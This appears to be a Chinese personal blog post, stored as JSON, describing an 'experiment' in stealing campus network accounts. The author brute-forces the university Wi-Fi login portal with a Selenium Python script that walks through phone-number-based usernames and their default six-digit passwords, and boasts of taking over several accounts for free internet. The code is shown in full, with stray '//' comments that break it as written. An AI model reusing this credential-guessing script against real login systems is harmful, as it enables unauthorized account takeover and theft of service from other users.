{"title":"记一次校园盗号实验","date":"2019-10-11T05:53:56.952Z","link":"2019/10/11/记一次校园盗号实验","tags":["Python"],"updated":"2019-10-11T06:53:34.300Z","content":"<p>在大学中网络是个大问题，大部分的学校都是用的校园网上网，登录方式一般是连接上wifi后打开校园网登录界面，登录成功后才有正常网络，我所在学校的校园网登录界面是这样的：</p>\n<p><img src=\"http://112.74.38.93:8000/uploads/1570773524875.png\" alt=\"1570773524875\" class=\"article-img\"></p>\n<p>往下翻公告显示：</p>\n<p><img src=\"file:///C:%5CUsers%5Cxiaofuzi%5CAppData%5CRoaming%5CTencent%5CUsers%5C939500867%5CTIM%5CWinTemp%5CRichOle%5CH%WF40EC0WMQ%7DJQNP0%5BFQ8T.png\" alt=\"img\" class=\"article-img\"></p>\n<p>一次偶然机会发现即时用户更改了初始密码后，登录时使用原初始密码仍然能够登录成功，并且一个账号能够登录两个终端，所以我就抱着能省就省的态度产生一个想法，用Python的自动化测试selenium硬破解账号密码登录上网。</p>\n<p>因为初始密码是手机后6位，就比较方便测试，随机给定一个号码递增依次连接，成功了就能正常上网了。</p>\n<p>以下是实验过程：</p>\n<p>查看源代码，找到用户名input标签的id，这里开发人员用了两层input来掩盖真正的input，获取真正input的id</p>\n<p><img src=\"http://112.74.38.93:8000/uploads/TIM%E5%9B%BE%E7%89%8720191011142755.png\" alt=\"TIM图片20191011142755\" class=\"article-img\"></p>\n<p>密码input也是一样，</p>\n<p><img src=\"http://112.74.38.93:8000/uploads/TIM%E5%9B%BE%E7%89%8720191011142931.png\" alt=\"TIM图片20191011142931\" class=\"article-img\"></p>\n<p>在Python 3.7中下载selenium：命令 pip install -U selenium ；</p>\n<p>以下是源代码：</p>\n<figure class=\"highlight python\"><div><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*-coding:utf8-*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.keys <span class=\"keyword\">import</span> Keys</span><br><span class=\"line\"></span><br><span class=\"line\">driver = webdriver.Chrome(executable_path=<span class=\"string\">'chromedriver.exe'</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 设置浏览器窗口</span></span><br><span class=\"line\">driver.set_window_size(<span class=\"number\">1080</span>, <span class=\"number\">800</span>)</span><br><span class=\"line\">driver.get(<span class=\"string\">'http://10.100.255.2'</span>)</span><br><span class=\"line\">zhanghao = <span class=\"number\">15281</span></span><br><span class=\"line\">demo = random.randrange(<span class=\"number\">1000</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">//随机一个尾号</span><br><span class=\"line\">mima = <span class=\"number\">730000</span> + demo</span><br><span class=\"line\">z = mima</span><br><span class=\"line\">print(<span class=\"string\">'请断开网络后运行'</span>)</span><br><span class=\"line\">print(<span class=\"string\">'正在硬破解请等待.........'</span>)</span><br><span class=\"line\">time.sleep(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"username\"</span>).send_keys(Keys.CONTROL+<span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">\t\t//选中用户名输入框全选</span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"username\"</span>).send_keys(str(zhanghao)+str(mima))</span><br><span class=\"line\">        //输入号码</span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mima == z:</span><br><span class=\"line\">                driver.find_element_by_id(<span class=\"string\">\"pwd_tip\"</span>).click()</span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"pwd\"</span>).click()</span><br><span class=\"line\"></span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"pwd\"</span>).send_keys(Keys.CONTROL + <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">\t\t//选中密码输入框全选</span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"pwd\"</span>).send_keys(str(mima))</span><br><span class=\"line\">\t\t//输入密码</span><br><span class=\"line\">        driver.find_element_by_id(<span class=\"string\">\"pwd\"</span>).send_keys(Keys.ENTER)</span><br><span class=\"line\">        //登录</span><br><span class=\"line\">        mima = mima + <span class=\"number\">1</span></span><br><span class=\"line\">        //号码加<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        print(<span class=\"string\">'已登录成功！！！！'</span>)</span><br></pre></td></tr></table></div></figure>\n\n<p>需要注意chrome浏览器版本对应Chromedriver版本，不然打不开chrome浏览器。</p>\n<p>最后成功扫到了几个账号，能够顺利上网了开森！</p>\n","next":{"title":"小项目开发文档","link":"2019/10/08/小项目开发文档"},"plink":"/2019/10/11/记一次校园盗号实验/"}